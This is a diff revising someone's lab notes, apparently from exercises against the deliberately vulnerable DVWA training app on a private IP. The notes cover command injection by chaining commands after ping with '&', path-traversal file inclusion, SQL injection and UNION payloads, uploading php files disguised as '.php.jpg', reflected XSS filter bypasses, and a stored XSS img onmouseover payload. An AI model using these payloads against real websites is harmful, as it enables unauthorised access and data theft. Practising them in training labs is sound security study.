@@ -1,9 +1,11 @@
 Command line execution:
-Addin an '&'' (single ampersand) to the end of a command will direct the shell to reun the command in the background. That way, we can append commands to the end of the "ping" command by putting '&'s between them. Using the ls command, for example, shows us the files present in the directory. Those are:
+Addin an '&'' (single ampersand) to the end of a command will instruct the shell to run the command in the background. That way, we can append commands to the end of the "ping" command by putting '&'s between them. Using the ls command, for example, shows us the files present in the directory. Those are:
 help
 index.php
 source
+
 Using the -l option:
+
 drwxr-xr-x 2 root root 4096 Apr 26  2011 help
 -rwxr-xr-x 1 root root 1541 Apr 26  2011 index.php
 drwxr-xr-x 2 root root 4096 Apr 26  2011 source
@@ -24,24 +26,31 @@ drwxr-xr-x 4 root root 4096 Apr 26  2011 xss_r
 drwxr-xr-x 4 root root 4096 Apr 26  2011 xss_s
 
 
-We can algo use the pwd command. This shows us the directory we are in:
+We can also use the pwd command. This shows us the directory we are in:
 /srv/apachejail/websec/medium/vulnerabilities/exec
 
 
 =======================================================================================
 File Inclusion:
 
-With help of the command execution vulnerability, we can look around and search for php files. We can do the following, for example:
+With help of the command execution vulnerability, we can look around and search for php files. We can paste the following link on the url bar, for example:
 http://10.0.23.21/vulnerabilities/fi/?page=../upload/index.php
 And the "upload" index will show up.
 
 
 =======================================================================================
 SQL injection:
-http://10.0.23.21/vulnerabilities/sqli_blind/?id=1%20or%202&Submit=Submit#
+We can paste the following at the input and i'll list all the users and it's respective id's:
+1 or 2
+
+
+We can also paste that in the input and submit it:
+
 2 UNION SELECT first_name, last_name FROM users WHERE user_id = 1
 
-2 UNION SELECT @@version
+this will show us users with id 2 and with id 1
+The Union makes both commands get executed (the $getid = "SELECT first_name, last_name FROM users WHERE user_id = $id"; the it does by itself, and the commands we injected)
+
 
 
 
@@ -49,14 +58,16 @@ http://10.0.23.21/vulnerabilities/sqli_blind/?id=1%20or%202&Submit=Submit#
 Unrestricted Upload:
 
 Using the Burp Suite, we can upload files that aren't jpg or png. For example, we can upload a php file and open it on the browser. 
+We could also upload files with extension '.php.jpg' , the upload will be allowed since it seems to be a image, when in reality it's a php scrip.
 
 =======================================================================================
 XSS reflected
 
-Because the page doesn't allow us to put code with the tag <script> we have to find another way around this. One possibility, is to use "script src" for example, and have a javascrpt script saved somewhere. We can also write <Script> (with caps lock).
+In this we can inject some scripts on the website.
+Because the page doesn't allow us to put code with the tag <script> we have to find another way around this. One possibility, is to use <script src""> for example, and have a javascrpt script saved somewhere. We can also write <Script> (with caps lock).
 
 =======================================================================================
 XSS stored
 
-The message field goes through various functions that stop us from putting some script there, but the name field doesn't. The only issue is that the name field is too small. We can go around this by inspecting the page, and changing "maxlenght" to something that suit us. 
+The message field goes through various functions that stop us from putting some script there, but the name field doesn't. The only issue is that the name field is too small. We can go around this by inspecting the page, and changing "maxlenght" of the name field to a greater value that suit us. 
  <img src="https://bit.ly/2z738CO" onmouseover="alert('uwu');">
